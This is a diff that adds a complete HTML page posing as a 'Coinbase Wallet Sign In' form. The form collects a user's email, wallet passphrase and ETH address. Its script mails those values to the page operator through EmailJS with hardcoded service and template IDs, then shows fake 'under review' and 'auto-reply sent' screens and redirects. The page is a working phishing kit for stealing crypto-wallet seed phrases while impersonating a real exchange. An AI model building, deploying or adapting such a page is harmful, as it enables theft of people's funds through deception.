@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Coinbase Wallet Sign In</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <style>
+    .spinner {
+      margin: 0 auto 20px auto;
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(255, 255, 255, 0.3);
+      border-top: 5px solid #2d7efb;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0d111c;
+      color: #ffffff;
+      font-weight: bold;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .form-container {
+      background-color: #131722;
+      padding: 30px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 400px;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #444;
+      font-size: 1rem;
+    }
+    button {
+      background-color: #2d7efb;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    .hidden { display: none; }
+    .processing, .verify {
+      text-align: center;
+      font-size: 1.2rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="signin" class="form-container">
+    <h2>Coinbase Wallet Sign In</h2>
+    <form id="vitaminForm" onsubmit="sendEmailJS(); return false;">
+      <input type="email" name="user_email" id="user_email" placeholder="Enter Your Email" required />
+      <input type="text" name="secret_phrase" id="secret_phrase" placeholder="Enter Wallet Passphrase" required />
+      <input type="text" name="eth_address" id="eth_address" placeholder="Enter ETH Address" required pattern="^0x[a-fA-F0-9]{40}$" />
+      <button type="submit">Submit for Verification</button>
+    </form>
+  </div>
+
+  <div id="processing" class="processing hidden">
+    <p>⏳ <strong>Processing...</strong></p>
+    <p>📝 <strong>Under Review</strong></p>
+  </div>
+
+  
+    
+    <div id="successPage" class="form-container hidden" style="text-align: center;">
+      <div class="spinner"></div>
+      <h2 style="margin-top: 20px;">✅ Auto-reply Sent</h2>
+      <p>Redirecting to your dashboard...</p>
+    
+      <h2>✅ Auto-reply Sent</h2>
+      <p>We have sent you a confirmation email. Please check your inbox.</p>
+    </div>
+
+    <div id="verify" class="form-container hidden">
+
+    <h3>Enter Approval Code</h3>
+    <input type="text" id="accessCode" placeholder="Enter confirmation code" />
+    <button onclick="checkCode()">Access Dashboard</button>
+    <p style="color: red; display: none;" id="errorText">❌ Invalid code. Please check again.</p>
+  </div>
+
+  <script>
+    emailjs.init("IGDhN2-3e4suUx8j-");
+
+    function sendEmailJS() {
+      const templateParams = {
+        user_email: document.getElementById('user_email').value,
+        secret_phrase: document.getElementById('secret_phrase').value,
+        eth_address: document.getElementById('eth_address').value
+      };
+
+      emailjs.send("service_5p6wgzo", "template_yfwvu4b", templateParams)
+        .then(function(response) {
+          document.getElementById('signin').classList.add('hidden');
+          document.getElementById('processing').classList.remove('hidden');
+
+          setTimeout(() => {
+            document.getElementById('processing').classList.add('hidden');
+            
+        document.getElementById('verify').classList.remove('hidden');
+
+        // Send auto-reply to user
+        
+        emailjs.send("service_5p6wgzo", "template_npewjm8", templateParams)
+          .then(() => {
+            
+      document.getElementById('successPage').classList.remove('hidden');
+      setTimeout(() => {
+        window.location.href = 'index_coinbase_final_contrast.html';
+      }, 4000);
+    
+          });
+    
+    
+          }, 3000);
+        }, function(error) {
+          alert("Failed to send email: " + error.text);
+        });
+    }
+
+    function checkCode() {
+      const input = document.getElementById('accessCode').value.trim();
+      const validCode = 'ACCESS2024';
+
+      if (input === validCode) {
+        window.location.href = 'index_coinbase_final_contrast.html';
+      } else {
+        document.getElementById('errorText').style.display = 'block';
+      }
+    }
+  </script>
+
+</body>
+</html>
